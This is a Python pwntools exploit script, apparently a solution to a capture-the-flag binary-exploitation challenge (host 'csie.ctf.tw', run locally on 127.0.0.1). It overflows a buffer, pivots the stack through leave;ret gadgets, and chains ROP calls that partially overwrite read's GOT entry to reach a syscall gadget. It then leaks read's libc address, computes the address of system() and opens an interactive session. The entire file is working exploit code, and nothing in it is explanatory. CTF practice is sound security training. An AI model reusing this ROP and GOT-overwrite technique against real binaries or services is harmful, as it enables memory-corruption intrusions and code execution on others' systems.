import time

from pwn import *

context.arch = 'amd64'

host = '127.0.0.1'
port = 8888
# host = 'csie.ctf.tw'
# port = 10135

r = remote(host, port)

input('Press enter to continue.')

payload = b'a'*0x20

rbp_20_read_leave_ret = 0x000000000040062b
buf1 = 0x00602000 - 0x200
buf2 = buf1 + 0x100
tmp_buf = buf1 - 0x30 + 0x20
read_got = 0x4004c0
read_plt = 0x601020
pop_rsi_r15 = 0x00000000004006b1
pop_rdi = 0x00000000004006b3
pop_rbp = 0x0000000000400560
leave_ret = 0x0000000000400646
ret = 0x0000000000400499
pop_rbx_rbp_r12_r13_r14_r15 = 0x4006aa
mov_rdx_r13_rsi_r14_edi_r15d_call_QWORD_r12_rbx_8 = 0x400690

rop = flat([buf1+0x20, rbp_20_read_leave_ret])
r.recvuntil(':')
r.send(payload + rop)

def add_4_rop(rop_list, new_rbp):
    """
    args:
        rop_list: a list contains 4 element.
        new_rbp: the new rbp address.
    """
    global r
    global tmp_buf
    global rbp_20_read_leave_ret
    rop = flat(rop_list + [tmp_buf, rbp_20_read_leave_ret])
    r.send(rop)
    rop = flat([0xaaaaaaaa]*4 + [new_rbp, rbp_20_read_leave_ret])
    r.send(rop)

# now rax=0, rdi=0x0, rsi=0x601048, rdx=0x40
add_4_rop([pop_rsi_r15, read_plt, 0xdeadbeaf, read_got], buf1+0x20+0x20)
# now rax=1, read_got = syscall
add_4_rop([pop_rdi, 0x1, pop_rsi_r15, read_plt], buf1+0x40+0x20)

rop = flat([0xdeadbeaf, read_got, leave_ret, 0xdeadbeaf] + [buf1-0x8, rbp_20_read_leave_ret])
r.send(rop)

# r.send(p64(read_got))
r.sendline(b'')

input('Press enter to continue.')

# answer read_plt
r.send(b'\x2e')

# get written result
read_addr = u64(r.recvn(0x30)[:8]) - 0xe
print('read_addr = ', hex(read_addr))

read_off = 0x00000000000f7220
system_off = 0x0000000000045390
libc_addr = read_addr - read_off
system_addr = libc_addr + system_off

print('system_addr = ', hex(system_addr))

r.interactive()
